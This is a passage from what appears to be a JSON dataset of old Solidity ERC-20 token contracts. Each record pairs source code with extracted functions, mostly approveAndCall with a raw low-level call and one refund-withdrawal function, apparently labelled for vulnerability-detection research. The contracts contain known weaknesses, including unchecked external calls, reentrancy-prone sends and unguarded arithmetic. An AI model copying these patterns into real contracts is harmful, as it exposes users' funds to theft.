Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1523"
  },
  "filename": "33790.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply(uint256) constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract SALES is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function SALES(\n ) {\n balances[msg.sender] = 1010101010;\n totalSupply =1010101010;\n name = \"SALES\";\n decimals = 2;\n symbol = \"SALES\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1524"
  },
  "filename": "33794.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract eCLM is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function eCLM(\n ) {\n balances[msg.sender] = 100000000;\n totalSupply = 100000000;\n name = \"eCLAM\";\n decimals = 6;\n symbol = \"eCLM\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1525"
  },
  "filename": "33798.sol",
  "content": "pragma solidity ^0.4.8;\ncontract ABTokenBase {\n uint256 public totalSupply;\n function balanceOf(address _owner) public constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract ABStandardToken is ABTokenBase {\n uint256 constant MAX_UINT256 = 2**256 - 1;\n function transfer(address _to, uint256 _value) public returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n uint256 allowance = allowed[_from][msg.sender];\n require(balances[_from] >= _value && allowance >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n if (allowance < MAX_UINT256) {\n allowed[_from][msg.sender] -= _value;\n }\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant public returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract ABToken is ABStandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1.1';\n function ABToken() public {\n totalSupply = 990000000;\n balances[msg.sender] = totalSupply;\n decimals = 4;\n name = \"Applied Blockchain Token\";\n symbol = \"ABT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1526"
  },
  "filename": "33837.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract BitcoinSapphire is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function BitcoinSapphire(\n ) {\n balances[msg.sender] = 300000000;\n totalSupply = 300000000;\n name = \"Bitcoin Sapphire\";\n decimals = 2;\n symbol = \"BCS\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1527"
  },
  "filename": "33864.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 10000000000000000;\n totalSupply = 100000000;\n name = \"TonTonToken\";\n decimals = 8;\n symbol = \"TON\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1528"
  },
  "filename": "33866.sol",
  "content": "pragma solidity ^0.4.16;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) public constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n function transfer(address _to, uint256 _value) public returns (bool success) {\n address sender = msg.sender;\n require(balances[sender] >= _value);\n balances[sender] -= _value;\n balances[_to] += _value;\n Transfer(sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract GigaGivingToken is StandardToken {\n using SafeMath for uint256;\n uint256 private fundingGoal = 0 ether;\n uint256 private amountRaised;\n uint256 private constant PHASE_1_PRICE = 1600000000000;\n uint256 private constant PHASE_2_PRICE = 2000000000000;\n uint256 private constant PHASE_3_PRICE = 2500000000000;\n uint256 private constant PHASE_4_PRICE = 4000000000000;\n uint256 private constant PHASE_5_PRICE = 5000000000000;\n uint256 private constant DURATION = 30 minutes;\n uint256 public constant TOTAL_TOKENS = 15000000;\n uint256 public constant CROWDSALE_TOKENS = 12000000;\n uint256 public startTime;\n uint256 public tokenSupply;\n address public creator;\n address public beneficiary;\n string public name = \"JTEST\";\n string public symbol = \"JT\";\n string public version = \"JT.0\";\n uint256 public decimals = 0;\n mapping(address => uint256) public ethBalanceOf;\n bool public fundingGoalReached = false;\n bool public crowdsaleClosed = false;\n bool public refundsOpen = false;\n function GigaGivingToken (address icoBeneficiary) public {\n creator = msg.sender;\n beneficiary = icoBeneficiary;\n totalSupply = TOTAL_TOKENS;\n balances[beneficiary] = TOTAL_TOKENS.sub(CROWDSALE_TOKENS);\n Transfer(0x0, icoBeneficiary, TOTAL_TOKENS.sub(CROWDSALE_TOKENS));\n balances[this] = CROWDSALE_TOKENS;\n Transfer(0x0, this, CROWDSALE_TOKENS);\n tokenSupply = CROWDSALE_TOKENS;\n startTime = 1510527600;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n function () public payable {\n require(now >= startTime);\n require(now <= startTime + DURATION);\n require(!crowdsaleClosed);\n require(msg.value > 0);\n uint256 amount = msg.value;\n uint256 coinTotal = 0;\n if (now > startTime + 20 minutes) {\n coinTotal = amount.div(PHASE_5_PRICE);\n } else if (now > startTime + 15 minutes) {\n coinTotal = amount.div(PHASE_4_PRICE);\n } else if (now > startTime + 10 minutes) {\n coinTotal = amount.div(PHASE_3_PRICE);\n } else if (now > startTime + 5 minutes) {\n coinTotal = amount.div(PHASE_2_PRICE);\n } else {\n coinTotal = amount.div(PHASE_1_PRICE);\n }\n ethBalanceOf[msg.sender] = ethBalanceOf[msg.sender].add(amount);\n balances[msg.sender] = balances[msg.sender].add(coinTotal);\n balances[this] = balances[this].sub(coinTotal);\n amountRaised = amountRaised.add(amount);\n tokenSupply = tokenSupply.sub(coinTotal);\n transfer(msg.sender, coinTotal);\n }\n modifier afterDeadline() {\n if (now >= (startTime + DURATION)) {\n _;\n }\n }\n function checkGoalReached() public afterDeadline {\n if (amountRaised >= fundingGoal) {\n fundingGoalReached = true;\n }\n crowdsaleClosed = true;\n }\n function safeWithdrawal() public afterDeadline {\n if (refundsOpen) {\n uint amount = ethBalanceOf[msg.sender];\n ethBalanceOf[msg.sender] = 0;\n if (amount > 0) {\n if (!msg.sender.send(amount)) {\n ethBalanceOf[msg.sender] = amount;\n }\n }\n }\n if (fundingGoalReached && beneficiary == msg.sender) {\n if (beneficiary.send(amountRaised)) {\n this.transfer(msg.sender, tokenSupply);\n } else {\n fundingGoalReached = false;\n }\n }\n }\n function enableRefunds() public afterDeadline {\n require(msg.sender == beneficiary);\n refundsOpen = true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}",
    "function safeWithdrawal() public afterDeadline {\nif (refundsOpen) {\nuint amount = ethBalanceOf[msg.sender];\nethBalanceOf[msg.sender] = 0;\nif (amount > 0) {\nif (!msg.sender.send(amount)) {\nethBalanceOf[msg.sender] = amount;\n}\n}\n}\nif (fundingGoalReached && beneficiary == msg.sender) {\nif (beneficiary.send(amountRaised)) {\nthis.transfer(msg.sender, tokenSupply);\n} else {\nfundingGoalReached = false;\n}\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1529"
  },
  "filename": "33878.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract EclubCoin is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function EclubCoin(\n ) {\n balances[msg.sender] = 50000000000000000;\n totalSupply = 50000000000000000;\n name = \"Eclub Coin\";\n decimals = 8;\n symbol = \"Eclub\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb152a"
  },
  "filename": "33888.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 21000000000000000000000000;\n totalSupply = 21000000000000000000000000;\n name = \"No SegWit2X\";\n decimals = 18;\n symbol = \"NO2X\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb152b"
  },
  "filename": "33889.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 21000000000000000000000000;\n totalSupply = 21000000000000000000000000;\n name = \"Ponzi\";\n decimals = 18;\n symbol = \"PZI\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb152c"
  },
  "filename": "33890.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract STFUcoin is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function STFUcoin(\n ) {\n balances[msg.sender] = 100;\n totalSupply = 100;\n name = \"STFUcoin\";\n decimals = 0;\n symbol = \"STFUs\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
